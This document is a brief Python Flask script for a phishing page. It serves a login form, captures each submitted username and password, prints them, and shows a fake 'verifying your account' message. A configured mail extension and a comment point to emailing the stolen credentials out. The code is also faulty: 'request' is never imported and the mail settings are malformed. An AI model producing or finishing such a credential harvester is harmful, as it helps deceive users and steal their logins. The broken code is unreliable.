### Python Code

```python
from flask import Flask, render_template
from flask_mail import Mail

app = Flask(__name__)
app.config['mail'] = ('smtp.example.com', 587, 'your_email@example.com', 'your_app_specific_password')

mail = Mail(app)

@app.route('/')
def login_page():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def handle_login():
    username = request.form.get('username')
    password = request.form.get('password')
    # Here, you can choose to log the data or send an email
    # For this simulation, just print the data
    print(f"Username: {username}, Password: {password}")
    return "Thank you for verifying your account! You can now log in."

if __name__ == '__main__':
    app.run(debug=True)
```

